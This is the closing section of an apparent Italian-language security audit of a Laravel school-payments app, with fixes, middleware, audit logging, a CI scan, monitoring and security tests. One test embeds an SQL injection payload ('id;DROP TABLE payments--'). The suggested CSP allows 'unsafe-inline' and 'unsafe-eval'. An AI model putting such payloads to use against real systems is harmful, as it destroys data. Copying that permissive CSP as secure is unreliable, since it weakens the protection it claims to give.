9. **FIX #4**: Rimuovere raw HTML output, implementare sanitization
10. **FIX #6**: Proteggere file download da path traversal

### MONTH 1 (30 giorni)
11. **FIX #9**: Implementare log sanitization
12. **FIX #12**: Aggiungere rate limiting admin routes
13. **FIX #14**: Standardizzare error handling
14. **FIX #15**: Implementare GDPR compliance completa

### FUTURE
15. **FIX #13**: Verificare configurazione production
16. **FIX #16**: Ottimizzare API throttling

---

## SECURITY BEST PRACTICES RECOMMENDATIONS

### 1. Security Headers
Implementare security headers in `app/Http/Middleware/SecurityHeaders.php`:

```php
<?php

namespace App\Http\Middleware;

use Closure;

class SecurityHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-XSS-Protection', '1; mode=block');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');

        // Content Security Policy
        $response->headers->set('Content-Security-Policy',
            "default-src 'self'; " .
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net; " .
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " .
            "font-src 'self' https://fonts.gstatic.com; " .
            "img-src 'self' data: https:; " .
            "connect-src 'self' https://api.paypal.com;"
        );

        return $response;
    }
}
```

Registrare in `bootstrap/app.php`:
```php
->withMiddleware(function (Middleware $middleware) {
    $middleware->append(\App\Http\Middleware\SecurityHeaders::class);
})
```

### 2. Audit Logging
Implementare audit trail per azioni sensibili:

```php
// app/Models/AuditLog.php
class AuditLog extends Model
{
    protected $fillable = [
        'user_id', 'school_id', 'action', 'model_type',
        'model_id', 'old_values', 'new_values', 'ip_address',
        'user_agent'
    ];

    protected $casts = [
        'old_values' => 'array',
        'new_values' => 'array'
    ];

    public static function log(string $action, $model, array $oldValues = [], array $newValues = [])
    {
        return self::create([
            'user_id' => auth()->id(),
            'school_id' => auth()->user()->school_id ?? null,
            'action' => $action,
            'model_type' => get_class($model),
            'model_id' => $model->id,
            'old_values' => $oldValues,
            'new_values' => $newValues,
            'ip_address' => request()->ip(),
            'user_agent' => request()->userAgent()
        ]);
    }
}

// Usare in controller critici:
// AdminPaymentController.php
public function update(Request $request, Payment $payment)
{
    $oldValues = $payment->toArray();

    // ... update logic

    AuditLog::log('payment.updated', $payment, $oldValues, $payment->fresh()->toArray());
}
```

### 3. Two-Factor Authentication
Considerare implementazione 2FA per admin:

```bash
composer require pragmarx/google2fa-laravel
```

### 4. Database Encryption
Cifrare colonne sensibili:

```bash
composer require ankurk91/laravel-model-encryption
```

```php
// User.php
use Ankurk91\Eloquent\EncryptedAttribute;

protected $encrypted = [
    'codice_fiscale',
    'phone',
    'address'
];
```

### 5. Security Scanning Automation
Implementare CI/CD security checks:

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Run Psalm Security Analysis
        run: |
          composer require --dev vimeo/psalm
          vendor/bin/psalm --taint-analysis

      - name: Run PHP Security Checker
        run: |
          composer require --dev enlightn/security-checker
          vendor/bin/security-checker security:check

      - name: Dependency Vulnerabilities Scan
        run: composer audit
```

---

## TESTING RECOMMENDATIONS

### Security Test Suite
Creare test di sicurezza automatizzati:

```php
// tests/Feature/Security/AuthorizationTest.php
class AuthorizationTest extends TestCase
{
    /** @test */
    public function admin_cannot_access_other_school_payments()
    {
        $school1 = School::factory()->create();
        $school2 = School::factory()->create();

        $admin1 = User::factory()->admin()->create(['school_id' => $school1->id]);
        $payment2 = Payment::factory()->create(['school_id' => $school2->id]);

        $this->actingAs($admin1)
            ->get(route('admin.payments.show', $payment2))
            ->assertStatus(404); // Or 403
    }

    /** @test */
    public function sql_injection_in_sort_parameter_is_prevented()
    {
        $admin = User::factory()->admin()->create();

        $this->actingAs($admin)
            ->get(route('admin.payments.index', [
                'sort' => 'id;DROP TABLE payments--'
            ]))
            ->assertStatus(200); // Should not crash

        // Verificare che la tabella esista ancora
        $this->assertDatabaseHas('payments', []);
    }

    /** @test */
    public function mass_assignment_protection_prevents_role_escalation()
    {
        $student = User::factory()->student()->create();

        $this->actingAs($student)
            ->patch(route('profile.update'), [
                'name' => 'Updated',
                'role' => 'admin' // Tentativo escalation
            ]);

        $this->assertEquals('student', $student->fresh()->role);
    }
}
```

---

## MONITORING & ALERTING

### Security Monitoring Setup

```php
// app/Services/SecurityMonitor.php
class SecurityMonitor
{
    public static function detectAnomalies()
    {
        // 1. Multiple failed login attempts
        $failedLogins = DB::table('failed_login_attempts')
            ->where('created_at', '>', now()->subMinutes(5))
            ->groupBy('ip_address')
            ->havingRaw('COUNT(*) > 5')
            ->get();

        foreach ($failedLogins as $suspect) {
            self::alert('Multiple failed logins from ' . $suspect->ip_address);
        }

        // 2. Accessi admin fuori orario
        if (now()->hour < 6 || now()->hour > 22) {
            $adminAccesses = DB::table('audit_logs')
                ->where('created_at', '>', now()->subMinutes(10))
                ->where('action', 'LIKE', 'admin.%')
                ->get();

            if ($adminAccesses->count() > 0) {
                self::alert('Admin access outside business hours');
            }
        }

        // 3. Bulk operations sospette
        $bulkOps = DB::table('audit_logs')
            ->where('created_at', '>', now()->subMinutes(5))
            ->where('action', 'LIKE', '%bulk%')
            ->count();

        if ($bulkOps > 10) {
            self::alert('Suspicious bulk operations detected');
        }
    }

    private static function alert(string $message)
    {
        Log::critical('SECURITY ALERT: ' . $message);

        // Inviare notifica Slack/Email agli admin
        // Notification::route('slack', config('logging.slack_webhook'))
        //     ->notify(new SecurityAlert($message));
    }
}

// Schedule in app/Console/Kernel.php
protected function schedule(Schedule $schedule)
{
    $schedule->call([SecurityMonitor::class, 'detectAnomalies'])
        ->everyFiveMinutes();
}
```

---

## CONCLUSION

L'applicazione presenta **vulnerabilità critiche** che richiedono attenzione immediata, specialmente:

1. **PayPal Webhook Signature** (CRITICAL) - Rischio finanziario diretto
2. **SQL Injection** (CRITICAL) - Rischio completo compromissione database

Dopo il fixing delle vulnerabilità CRITICAL e HIGH, l'applicazione raggiungerà un livello di sicurezza accettabile per ambiente production.

**Estimated Total Remediation Time:** 2-3 settimane di sviluppo
**Recommended Security Re-Audit:** Dopo 30 giorni dal completamento fix

---

## APPENDIX A - SECURITY CHECKLIST PRE-PRODUCTION

- [ ] Tutte le vulnerabilità CRITICAL fixate
- [ ] Tutte le vulnerabilità HIGH fixate
- [ ] APP_DEBUG=false in production
- [ ] HTTPS obbligatorio (HSTS abilitato)
- [ ] Security headers configurati
- [ ] Rate limiting attivo su tutti gli endpoint
- [ ] PayPal webhook signature verification implementata
- [ ] Credentials cifrate in database
- [ ] Audit logging attivo
- [ ] Backup cifrati configurati
- [ ] WAF (Web Application Firewall) configurato
- [ ] Monitoring e alerting attivi
- [ ] Security tests passing al 100%
- [ ] Dependency vulnerabilities scan pulito
- [ ] GDPR compliance verificata
- [ ] Penetration testing completato

---

## APPENDIX B - CONTACT & SUPPORT

Per domande su questo audit report:
- **Security Team:** security@danzafacile.it
- **DevOps Team:** devops@danzafacile.it
- **Emergency Contact:** +39 XXX XXX XXXX

**CONFIDENTIAL - NOT FOR DISTRIBUTION**

